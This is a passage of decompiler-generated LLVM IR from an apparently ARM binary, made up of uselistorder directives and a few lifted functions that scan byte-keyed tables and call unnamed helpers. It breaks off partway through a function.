  uselistorder i32 %stack_var_-20856.0.ph, { 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 58, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_8500, { 1, 0 }
  uselistorder i32 %v0_8500, { 1, 0 }
  uselistorder i32 %v2_84d0, { 2, 1, 3, 0, 5, 4, 6 }
  uselistorder i32 %v2_84c0, { 1, 0 }
  uselistorder i32 %v8_84a4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_83b0, { 2, 1, 5, 4, 0, 3, 6 }
  uselistorder i32 %v0_839c, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_8390, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32 %v1_831c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_830c, { 1, 0 }
  uselistorder i32 %v3_8308, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_8300, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_82f4, { 1, 0, 2 }
  uselistorder i32 %v10_82f0, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82d8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_82c8, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_82a8, { 1, 0 }
  uselistorder i32 %v0_82a4, { 1, 0, 3, 2 }
  uselistorder i8* %tmp199, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_8280, { 0, 16, 22, 23, 24, 1, 19, 2, 20, 21, 25, 10, 3, 15, 4, 17, 18, 26, 5, 14, 6, 27, 7, 13, 28, 8, 12, 29, 9, 11, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 %v5_8278, { 1, 0 }
  uselistorder i32 %v6_8200, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_81e4, { 2, 1, 0 }
  uselistorder i32 %v1_81d8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20809, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 1, 41, 44, 42, 43 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 14, 15, 8, 9, 10, 13, 11, 12, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 6, 5, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 12, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 32, 162, 163, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 146, 147, 148, 149, 97, 98, 99, 100, 104, 101, 102, 103, 105, 106, 109, 110, 107, 108, 111, 113, 112, 114, 115, 116, 117, 118, 123, 119, 120, 121, 122, 124, 126, 125, 2, 128, 127, 1, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 164, 145, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 104, 105, 106, 107, 108, 109, 110, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 101, 102, 103, 68, 69, 70, 71, 72, 75, 76, 73, 74, 77, 78, 79, 80, 81, 82, 83, 85, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 168, 25, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 166, 167, 169, 170, 171, 9, 172, 40, 41, 42, 45, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 159, 160, 161, 162, 163, 164, 165, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 130, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 18, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 208, 34, 206, 33, 74, 40, 35, 37, 36, 38, 41, 39, 43, 42, 45, 44, 46, 48, 47, 49, 52, 50, 51, 54, 53, 57, 55, 56, 58, 59, 60, 62, 61, 63, 64, 65, 67, 66, 68, 70, 69, 72, 71, 73, 76, 75, 78, 77, 79, 81, 80, 83, 82, 84, 86, 85, 87, 90, 88, 89, 92, 91, 95, 93, 94, 96, 98, 97, 6, 330, 8, 331, 332, 15, 333, 7, 335, 334, 336, 337, 338, 14, 9, 339, 341, 340, 342, 344, 343, 345, 346, 347, 100, 99, 102, 101, 103, 105, 104, 106, 108, 107, 110, 109, 111, 112, 115, 113, 114, 116, 118, 117, 119, 121, 120, 123, 122, 124, 125, 126, 128, 127, 129, 131, 130, 133, 132, 135, 134, 136, 138, 137, 139, 140, 142, 141, 17, 143, 145, 144, 147, 146, 149, 148, 152, 150, 151, 154, 153, 155, 157, 156, 158, 160, 159, 162, 161, 164, 163, 165, 167, 166, 168, 170, 169, 171, 172, 174, 173, 176, 175, 177, 179, 178, 180, 182, 181, 183, 184, 186, 185, 188, 187, 189, 191, 190, 192, 194, 193, 195, 197, 196, 198, 199, 201, 200, 203, 202, 211, 204, 205, 276, 207, 209, 210, 16, 212, 213, 215, 214, 216, 217, 218, 219, 220, 221, 223, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 222, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 258, 257, 259, 260, 261, 262, 264, 263, 265, 266, 267, 5, 268, 4, 269, 271, 270, 1, 2, 273, 272, 281, 274, 275, 277, 279, 278, 280, 283, 282, 3, 285, 284, 13, 286, 12, 287, 288, 11, 289, 10, 290, 291, 293, 292, 295, 294, 296, 297, 298, 300, 299, 301, 302, 304, 303, 306, 305, 308, 307, 310, 309, 312, 311, 313, 314, 315, 316, 317, 318, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 31, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 50, 51, 52, 53, 54, 55, 56, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 48, 49, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 6, 3, 2, 28, 7, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 52, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 140, 141, 98, 100, 99, 101, 102, 103, 108, 110, 109, 104, 105, 106, 107, 111, 112, 113, 114, 115, 116, 124, 125, 117, 118, 119, 120, 121, 122, 123, 126, 0, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 51, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 133, 134, 98, 99, 104, 103, 100, 101, 102, 105, 106, 107, 108, 109, 110, 118, 119, 111, 112, 113, 114, 115, 116, 117, 120, 0, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 51, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 136, 137, 98, 99, 100, 105, 107, 106, 101, 102, 103, 104, 108, 109, 110, 111, 112, 113, 121, 122, 114, 115, 116, 117, 118, 119, 120, 123, 0, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 53, 47, 48, 49, 50, 51, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 67, 65, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 150, 151, 152, 103, 104, 109, 111, 110, 105, 106, 107, 108, 112, 113, 114, 115, 116, 117, 118, 128, 129, 119, 120, 121, 122, 123, 124, 125, 126, 127, 130, 131, 0, 135, 132, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i32 ptrtoint (i32* @global_var_15798.51 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15788.46 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15780.44 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1577c.42 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15754.28 to i32), { 0, 2, 1, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e70, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d1c, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %dec_label_pc_9cf0, { 2, 0, 1 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a14, { 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %dec_label_pc_99e8, { 2, 0, 1 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_98c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9884, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_9838, { 1, 0 }
  uselistorder label %dec_label_pc_9810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9804, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_965c, { 1, 0 }
  uselistorder label %dec_label_pc_95ec, { 1, 0 }
  uselistorder label %dec_label_pc_94c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_9498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9400, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_9284, { 1, 0 }
  uselistorder label %dec_label_pc_927c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9254, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_9124, { 2, 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %.thread47, { 3, 0, 1, 2 }
  uselistorder label %bb214, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8d48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8ccc, { 1, 0 }
  uselistorder label %dec_label_pc_8cb4, { 1, 0 }
  uselistorder label %dec_label_pc_8c78, { 1, 0 }
  uselistorder label %dec_label_pc_8c04, { 1, 0 }
  uselistorder label %dec_label_pc_8bcc, { 1, 0 }
  uselistorder label %dec_label_pc_890c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88dc, { 1, 0 }
  uselistorder label %dec_label_pc_8838, { 7, 8, 2, 9, 1, 10, 3, 14, 15, 11, 0, 12, 13, 6, 4, 5 }
  uselistorder label %dec_label_pc_8630, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_855c.dec_label_pc_855c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_853c.dec_label_pc_853c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8528, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8528.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c8, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b8, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f84(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f84:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_9f84 = urem i32 %arg1, 256
  %v2_9f88 = icmp eq i32 %v1_9f84, 0
  %v1_9f90 = urem i32 %arg3, 256
  br i1 %v2_9f88, label %dec_label_pc_9fd4, label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f84
  %v0_9f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_9f9c = add i32 %v0_9f9c, 4
  %v2_9f9c = inttoptr i32 %v1_9f9c to i8*
  %v3_9f9c = load i8, i8* %v2_9f9c, align 1
  %v4_9f9c = zext i8 %v3_9f9c to i32
  %v9_9fa0 = icmp eq i32 %v4_9f9c, %v1_9f90
  br i1 %v9_9fa0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.preheader

dec_label_pc_9fc4.preheader:                      ; preds = %dec_label_pc_9f9c
  br label %dec_label_pc_9fc4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fc4
  %v1_9fb4 = add i32 %v0_9fbc.in, 12
  %v2_9fb4 = inttoptr i32 %v1_9fb4 to i8*
  %v3_9fb4 = load i8, i8* %v2_9fb4, align 1
  %v4_9fb4 = zext i8 %v3_9fb4 to i32
  %v9_9fb8 = icmp eq i32 %v4_9fb4, %v1_9f90
  br i1 %v9_9fb8, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9fc4.preheader, %dec_label_pc_9fb4
  %v0_9fbc.in = phi i32 [ %v0_9f9c, %dec_label_pc_9fc4.preheader ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v0_9fc4 = phi i32 [ 0, %dec_label_pc_9fc4.preheader ], [ %v1_9fc4, %dec_label_pc_9fb4 ]
  %v0_9fbc = add i32 %v0_9fbc.in, 8
  %v1_9fc4 = add i32 %v0_9fc4, 1
  store i32 %v1_9fc4, i32* @lr, align 4
  %v9_9fc8 = icmp eq i32 %v1_9fc4, %v1_9f84
  store i32 %v0_9fbc, i32* %r1.global-to-local, align 4
  br i1 %v9_9fc8, label %dec_label_pc_9fd4, label %dec_label_pc_9fb4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9f84
  ret i32 %arg4

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fb4, %dec_label_pc_9f9c
  %v0_9fdc = phi i32 [ %v0_9f9c, %dec_label_pc_9f9c ], [ %v0_9fbc, %dec_label_pc_9fb4 ]
  %v1_9fdc = inttoptr i32 %v0_9fdc to i32*
  %v2_9fdc = load i32, i32* %v1_9fdc, align 4
  ret i32 %v2_9fdc

; uselistorder directives
  uselistorder i32 %v1_9fc4, { 1, 2, 0 }
  uselistorder i32 %v0_9fbc, { 1, 0, 2 }
  uselistorder i32 %v0_9fbc.in, { 1, 0 }
  uselistorder i32 %v0_9f9c, { 1, 0, 2 }
  uselistorder i32 %v1_9f90, { 1, 0 }
  uselistorder i32 %v1_9f84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fc4, { 1, 0 }
}

define i32 @function_9fe8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9fe8:
  store i32 %arg1, i32* @r6, align 4
  %v1_9ff4 = urem i32 %arg2, 256
  store i32 %v1_9ff4, i32* @r7, align 4
  %v0_a000 = call i32 @function_12ec8()
  %v7_a004 = icmp eq i32 %v0_a000, -1
  %tmp23 = icmp slt i32 %v0_a000, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9fe8
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_9fe8
  %. = zext i1 %v7_a004 to i32
  store i32 %., i32* @r5, align 4
  %v2_a01c = icmp eq i1 %v7_a004, false
  br i1 %v2_a01c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  ret i32 %v0_a000

bb26:                                             ; preds = %bb24
  %v0_a024 = call i32 @function_12ec8()
  %v7_a028 = icmp eq i32 %v0_a024, -1
  store i32 %v0_a024, i32* @r4, align 4
  br i1 %v7_a028, label %dec_label_pc_a058, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %bb26
  %v2_a034 = icmp eq i32 %v0_a024, 0
  br i1 %v2_a034, label %dec_label_pc_a03c, label %dec_label_pc_a060

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a034
  %v0_a03c = load i32, i32* @r6, align 4
  %v1_a040 = call i32 @function_142c4(i32 %v0_a03c)
  %v0_a044 = call i32 @function_12f20()
  %v2_a04c = call i32 @function_12f9c(i32 %v0_a044, i32 9)
  %v0_a050 = load i32, i32* @r4, align 4
  %v1_a054 = call i32 @function_14230(i32 %v0_a050)
  br label %dec_label_pc_a058

dec_label_pc_a058:                                ; preds = %bb26, %dec_label_pc_a03c
  %v0_a058 = load i32, i32* @r5, align 4
  %v1_a05c = call i32 @function_14230(i32 %v0_a058)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a034, %dec_label_pc_a058
  %v2_a064 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a064 = zext i8 %v2_a064 to i32
  %v2_a068 = icmp eq i8 %v2_a064, 0
  br i1 %v2_a068, label %dec_label_pc_a0ac, label %dec_label_pc_a070

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060
  %v2_a074 = load i32, i32* @global_var_1e3b4.57, align 4
  %v1_a078 = inttoptr i32 %v2_a074 to i32*
  %v2_a078 = load i32, i32* %v1_a078, align 4
  store i32 %v2_a078, i32* @ip, align 4
  %v1_a07c = add i32 %v2_a078, 4
  %v2_a07c = inttoptr i32 %v1_a07c to i8*
  %v3_a07c = load i8, i8* %v2_a07c, align 1
  %v4_a07c = zext i8 %v3_a07c to i32
  %v1_a080 = load i32, i32* @r7, align 4
  %v9_a080 = icmp eq i32 %v4_a07c, %v1_a080
  br i1 %v9_a080, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0.preheader

dec_label_pc_a0a0.preheader:                      ; preds = %dec_label_pc_a070
  %v1_a084 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a0a0

dec_label_pc_a090:                                ; preds = %dec_label_pc_a0a0
  %v4_a090 = mul i32 %v1_a0a0, 4
  %v5_a090 = add i32 %v4_a090, %v2_a074
  %v6_a090 = inttoptr i32 %v5_a090 to i32*
  %v7_a090 = load i32, i32* %v6_a090, align 4
  store i32 %v7_a090, i32* @ip, align 4
  %v1_a094 = add i32 %v7_a090, 4
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v9_a098 = icmp eq i32 %v4_a094, %v1_a080
  br i1 %v9_a098, label %dec_label_pc_a0b4, label %dec_label_pc_a0a0

dec_label_pc_a0a0:                                ; preds = %dec_label_pc_a0a0.preheader, %dec_label_pc_a090
  %v0_a0a0 = phi i32 [ %v1_a084, %dec_label_pc_a0a0.preheader ], [ %v1_a0a0, %dec_label_pc_a090 ]
  %v1_a0a0 = add i32 %v0_a0a0, 1
  %v9_a0a4 = icmp eq i32 %v1_a0a0, %v3_a064
  br i1 %v9_a0a4, label %dec_label_pc_a0ac, label %dec_label_pc_a090

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a0a0, %dec_label_pc_a060, %dec_label_pc_a0b4
  %v1_a0b0 = call i32 @function_14230(i32 0)
  %v0_a0c8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_a090, %dec_label_pc_a070, %dec_label_pc_a0ac
  %v0_a0c8 = phi i32 [ %v2_a078, %dec_label_pc_a070 ], [ %v0_a0c8.pre, %dec_label_pc_a0ac ], [ %v7_a090, %dec_label_pc_a090 ]
  %v1_a0c8 = inttoptr i32 %v0_a0c8 to i32*
  %v2_a0c8 = load i32, i32* %v1_a0c8, align 4
  call void @__pseudo_branch(i32 %v2_a0c8)
  br label %dec_label_pc_a0ac

; uselistorder directives
  uselistorder i32 %v1_a0a0, { 2, 0, 1 }
  uselistorder i32 %v0_a024, { 1, 2, 0 }
  uselistorder i1 %v7_a004, { 1, 0 }
  uselistorder i32 %v0_a000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a0a0, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_a0d8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a0d8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_a0d8 = load i32, i32* @r4, align 4
  %v6_a0d8 = load i32, i32* @r5, align 4
  %v9_a0d8 = load i32, i32* @r6, align 4
  %v12_a0d8 = load i32, i32* @r7, align 4
  %v15_a0d8 = load i32, i32* @r8, align 4
  %v18_a0d8 = load i32, i32* @sb, align 4
  %v21_a0d8 = load i32, i32* @sl, align 4
  %v27_a0d8 = load i32, i32* @lr, align 4
  %v7_a0dc = icmp eq i32 %arg2, 3
  store i1 %v7_a0dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_a0e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a0e8, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_a0fc, label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0d8
  %v7_a0f0 = icmp eq i32 %arg2, 4
  store i1 %v7_a0f0, i1* %cpsr_z.global-to-local, align 1
  %v1_a0f4 = inttoptr i32 %v0_a0e8 to i32*
  %v2_a0f4 = load i32, i32* %v1_a0f4, align 4
  store i32 %v2_a0f4, i32* @sl, align 4
  br i1 %v7_a0f0, label %dec_label_pc_a0fc, label %dec_label_pc_a104

